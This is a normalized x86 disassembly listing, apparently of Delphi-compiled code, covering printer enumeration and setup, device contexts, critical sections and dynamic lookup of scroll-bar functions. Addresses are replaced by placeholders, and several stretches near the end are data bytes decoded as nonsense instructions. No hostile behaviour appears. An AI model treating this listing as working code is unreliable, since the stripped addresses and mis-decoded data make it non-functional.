mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42af2c
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b00b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40403c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b012
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a64
lea eax [ ebp - 0x8 ]
call sub_4058a8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4297a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4058c0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058ec
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b088
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_42b11d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40403c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42ae14
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b124
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
call sub_42a928
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42a958
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42aaf8
sub_42b148
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4297a0
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4297a0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418440
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4297a0
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418440
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418440
sub_42b1d4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_42a8e8
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403270
mov eax [ esi + 0x14 ]
call sub_403270
mov eax [ esi + 0x10 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4058a8
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_42b228
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b25f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b266
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42b290
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b2b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b2bc
retn
sub_42b3d0
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42b49c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4041e0
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_4041e0
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4041e0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42b4fc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42b56f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041e0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_4043f4
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b576
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041e0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_4043f4
je r-xdata
sub_42b580
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42b5bc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_42b638
mov eax esi
call sub_42bf50
mov eax esi
call sub_42bf8c
mov eax [ esi + 0x4 ]
call sub_403270
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_42b7d4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_42b638
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42b756
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b75d
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_42b764
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_424ba0
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42baf8
push eax
mov eax esi
call sub_42bb10
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4044a8
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_424ba0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x8 ]
call sub_42b404
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_424ba0
sub_42b764
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_42b7c9
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b7d0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x8 ]
call sub_42b404
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x4 ]
call sub_42b404
jmp r-xdata
sub_42b7d4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b764
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_42b808
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42baf8
push eax
mov eax ebx
call sub_42bb10
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4044a8
mov edx eax
mov eax edi
call sub_4086f0
mov eax [ esi + 0x4 ]
call sub_4044a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4086f0
mov eax [ esi + 0xc ]
call sub_4044a8
mov edx eax
mov eax [ ebp + 0xc ]
call sub_4086f0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b874
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_42b8b0
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42bae7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42b764
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42bf8c
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_42b874
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_42b638
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42bb10
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b49c
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408da8
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_4041e0
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42baee
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_40400c
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_42b4fc
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_42b874
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_42bb10
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bd3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42bcfc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026f4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42bceb
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd46
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_40400c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402714
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42b3d0
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b49c
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_4041e0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b49c
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408da8
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42b3d0
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42bd50
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bf2d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407d40
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42beed
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42b3d0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402714
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42bb10
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40ca34
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x41c ]
call sub_42b404
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4044a8
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x8 ]
call sub_4044a8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42b8b0
call sub_403ad0
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_4041e0
mov edx [ ebp - 0x420 ]
pop eax
call sub_407f74
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf34
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_40400c
retn
sub_42bf50
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40cf90
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403270
inc edi
dec ebx
jne r-xdata
sub_42bfb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bfe9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bff0
retn
mov eax [ rw-data ]
call sub_403270
sub_42bffc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c030
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c058
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c2da
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c301
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c308
retn
sub_42c31c
push 0x42c3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] dh
inc edx
add [ eax + eax ] al
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add al ch
retn
sub_42c36e
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
outsb
lea eax [ eax ]
retn
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x34 ] si
retn
sub_42c384
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xc3
inc edx
add [ eax + eax ] bl
add [ eax ] al
sbb al 0xc3
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] dh
les eax [ edx ]
pushad
les eax [ edx ]
insb
les eax [ edx ]
adc [ ebx + eax * 2 + 0x72 ] dl
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42c3f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42c430
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_42c488
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c4ad
push [ fs : eax ]
